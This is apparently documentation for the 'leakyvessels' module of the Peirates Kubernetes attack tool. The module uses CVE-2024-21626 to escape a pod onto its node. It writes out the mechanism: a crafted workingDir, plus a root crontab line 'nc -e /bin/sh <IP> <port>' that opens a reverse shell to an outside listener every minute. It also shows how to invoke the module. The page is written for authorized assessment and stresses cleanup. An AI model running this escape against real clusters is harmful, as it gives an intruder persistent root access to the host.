# Leaky Vessels host escape pod

## Menu entry

- Number: `23`
- Canonical command: `leakyvessels`
- Alias: `cve-2024-21626`

## Purpose

Create a pod intended to exploit CVE-2024-21626 through a crafted working directory and append a recurring netcat reverse-shell command to the node's `/etc/crontab`.

This is an experimental, destructive host-escape technique. Use it only on a disposable or explicitly authorized node where exploit attempts, host filesystem modification, image pulls, and callback traffic are all in scope.

## Prerequisites and authorization

The current Kubernetes identity must be able to create pods in the current namespace. Peirates checks this with a SelfSubjectAccessReview unless authorization prechecks are disabled. Admission controls must allow the crafted pod.

The node's runtime must be vulnerable to CVE-2024-21626 and expose the file descriptor assumed by the hard-coded working directory `/proc/self/fd/8`. The pod pulls `alpine:latest`. A successful callback also depends on the node having a cron service and a netcat implementation supporting `-e`, plus network reachability to the supplied listener.

The menu describes the affected target as `runc versions <1.12`; treat that wording as a menu claim, not a runtime detection result. The module performs no version or vulnerability check.

## Usage

Interactive menu:

1. Enter `23`, `leakyvessels`, or `cve-2024-21626`.
2. Enter the authorized callback IP and port when prompted.

One-shot module mode still reads two input lines. For deterministic automation, pipe both values:

```sh
printf '%s\n%s\n' '<callback-ip>' '<callback-port>' | peirates -c -m leakyvessels
```

The number and alias work after `-m` too. This is not fully non-interactive because callback values have no flags; automation must provide `IP` and `port` on standard input. **Unlike the HostPath command, this handler ignores input-read errors: closed or incomplete standard input does not abort and can create a pod containing an invalid payload with blank callback fields.** `-c` is optional and only skips cloud detection.

## What it does

Peirates writes a temporary manifest for `cve-2024-21626-<random>`. The pod uses `alpine:latest`, sets `workingDir` to `/proc/self/fd/8`, and runs a shell command intended to traverse to the host and append this form of entry to `/etc/crontab`:

```text
* * * * * root nc -e /bin/sh <IP> <port>
```

It submits the manifest with `kubectl create` and returns immediately after reporting pod creation. It does not wait for the pod, inspect its status, verify the host write, verify a callback, or delete the pod.

## Expected output

The module explains the intended exploit, displays local addresses, prints the temporary manifest path as a `DEBUG` line, and reports the randomized pod name if the create request succeeds.

`Pod ... created` means only that Kubernetes accepted the pod object. It is not evidence that the runtime was vulnerable, the cron entry was written, or a shell connected.

## Side effects and cleanup

The module intentionally tries to append a reverse-shell command that runs every minute on the node. If exploitation succeeds, that crontab change persists independently of the pod. Remove the exact assessment-created entry from the affected node and terminate any callback shell after testing.

The created `cve-2024-21626-*` pod is never deleted by the module, whether the exploit succeeds or fails. Identify and delete the pod explicitly. The temporary manifest is removed when the handler returns.

## Failure modes

- The create-pod authorization check or admission policy may deny the pod.
- Patched or otherwise unaffected runtimes will not honor the crafted escape path.
- `/proc/self/fd/8` is a hard-coded, environment-sensitive assumption.
- Image pull failure or lack of `/bin/sh` prevents the payload from running.
- The node may lack cron, `nc`, or support for `nc -e`.
- Invalid or unreachable callback values prevent a shell; input is not validated before shell interpolation.
- Closed or incomplete standard input is not rejected and may still stage the hostile pod with blank callback values.
- The module does not surface asynchronous pod/runtime failure and ignores its returned error at registry dispatch.
- It provides no automatic cleanup and has no direct functional or live integration test in this repository.

## Implementation and tests

- [Menu registration and handler](../../internal/app/module_registry.go)
- [Aliases](../../internal/app/dispatch.go)
- [CVE pod implementation](../../internal/app/cve_2024_21626.go)
- [General module dispatch and completion tests](../../internal/app/module_commands_test.go)

Current automated coverage verifies that the command is registered, dispatchable, and does not block indefinitely when standard input is closed. It does not verify the exploit, payload, host modification, callback, or cleanup. Treat this module as experimental.
